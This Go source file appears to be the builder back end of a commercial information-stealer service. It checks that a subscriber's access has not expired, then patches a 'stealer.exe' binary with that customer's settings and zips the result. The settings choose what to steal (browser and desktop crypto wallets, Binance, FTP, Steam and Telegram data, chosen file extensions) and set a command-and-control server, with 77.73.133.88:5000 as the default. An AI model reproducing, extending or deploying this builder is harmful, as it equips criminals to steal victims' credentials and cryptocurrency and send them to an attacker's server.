package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"os"
	"strings"
	"time"
)

func SQLi_Guard(s string) bool {
	restriction := []string{`=`, `+`, `/`, `\`, `-`, `!`, `?`, `_`, `$`, `#`, `&`, `|`, `"`, `'`, " "}
	for _, r := range restriction {
		if strings.Contains(s, r) {
			return false
		}
	}
	return true
}

func check_user(login, password string) (bool, string) {
	if SQLi_Guard(login) && SQLi_Guard(password) {
		if rows, err := db.Query("select subtime from users where login = ? and password = ?", login, password); err == nil {
			subtime := ""
			for rows.Next() {
				rows.Scan(&subtime)
			}
			if check, err := time.Parse("2006-01-02", subtime); err == nil {
				if today := time.Now(); today.Before(check) {
					return true, subtime
				}
			}
		}
	} else {
		fmt.Println("sqli")
	}

	return false, ""
}

func Build(login, tag, grabext, domaindetect, browser_wallets, desktop_wallets, wallets_core, binance, ftp, steam, telegram, plugins, grabpath, server string) ([]byte, int8) {
	file, err := os.ReadFile("stealer.exe")
	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	if err != nil {
		return nil, 1
	}
	if len(tag) < 27 {
		for i := 27 - len(tag); i > 0; i-- {
			tag += "$"
		}
	} else if len(tag) > 27 {
		return nil, 1
	}
	if len(login) < 27 {
		for i := 27 - len(login); i > 0; i-- {
			login += "$"
		}
	} else if len(login) > 27 {
		return nil, 1
	}
	if len(grabext) < 36 {
		for i := 36 - len(grabext); i > 0; i-- {
			grabext += "$"
		}
	} else if len(grabext) > 36 {
		return nil, 1
	}
	if len(domaindetect) < 27 {
		for i := 27 - len(domaindetect); i > 0; i-- {
			domaindetect += "$"
		}
	} else if len(domaindetect) > 27 {
		return nil, 1
	}
	for i := 16 - len(browser_wallets); i > 0; i-- {
		browser_wallets += "$"
	}
	for i := 16 - len(desktop_wallets); i > 0; i-- {
		desktop_wallets += "$"
	}
	for i := 13 - len(wallets_core); i > 0; i-- {
		wallets_core += "$"
	}
	for i := 8 - len(binance); i > 0; i-- {
		binance += "$"
	}
	for i := 9 - len(ftp); i > 0; i-- {
		ftp += "$"
	}
	for i := 11 - len(steam); i > 0; i-- {
		steam += "$"
	}
	for i := 14 - len(telegram); i > 0; i-- {
		telegram += "$"
	}
	for i := 13 - len(plugins); i > 0; i-- {
		plugins += "$"
	}
	for i := 28 - len(grabpath); i > 0; i-- {
		grabpath += "$"
	}
	servers := strings.Split(server, ":")
	port := ""
	server1 := ""
	if len(servers) == 2 {
		server1 = servers[0]
		port = servers[1]
	}
	newfile := bytes.Replace(file, []byte("tipouser$$$$$$$$$$$$$$$$$$$"), []byte(login), -1)
	newfile = bytes.Replace(newfile, []byte("tipotag$$$$$$$$$$$$$$$$$$$$"), []byte(tag), -1)
	newfile = bytes.Replace(newfile, []byte(".tipo,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"), []byte(grabext), -1)
	newfile = bytes.Replace(newfile, []byte("tipodomain$$$$$$$$$$$$$$$$$"), []byte(domaindetect), -1)
	newfile = bytes.Replace(newfile, []byte("browser_wallets$"), []byte(browser_wallets), -1)
	newfile = bytes.Replace(newfile, []byte("desktop_wallets$"), []byte(desktop_wallets), -1)
	newfile = bytes.Replace(newfile, []byte("wallets_core$"), []byte(wallets_core), -1)
	newfile = bytes.Replace(newfile, []byte("binance$"), []byte(binance), -1)
	newfile = bytes.Replace(newfile, []byte("ftp_conf$"), []byte(ftp), -1)
	newfile = bytes.Replace(newfile, []byte("steam_conf$"), []byte(steam), -1)
	newfile = bytes.Replace(newfile, []byte("telegram_conf$"), []byte(telegram), -1)
	newfile = bytes.Replace(newfile, []byte("plugins_conf$"), []byte(plugins), -1)
	newfile = bytes.Replace(newfile, []byte("GRABPATH_CONF$$$$$$$$$$$$$$$"), []byte(grabpath), -1)
	if server1 != "" && port != "" {
		for i := 16 - len(server1); i > 0; i-- {
			server1 += "$"
		}
		newfile = bytes.Replace(newfile, []byte("77.73.133.88$$$$"), []byte(server1), -1)
		for i := 8 - len(port); i > 0; i-- {
			port += "$"
		}
		newfile = bytes.Replace(newfile, []byte("5000$$$$"), []byte(port), -1)
	}
	if ff, err := writer.Create(login + ".exe"); err == nil {
		ff.Write(newfile)
		writer.Close()
		return buf.Bytes(), 0
	}
	return nil, 1
}
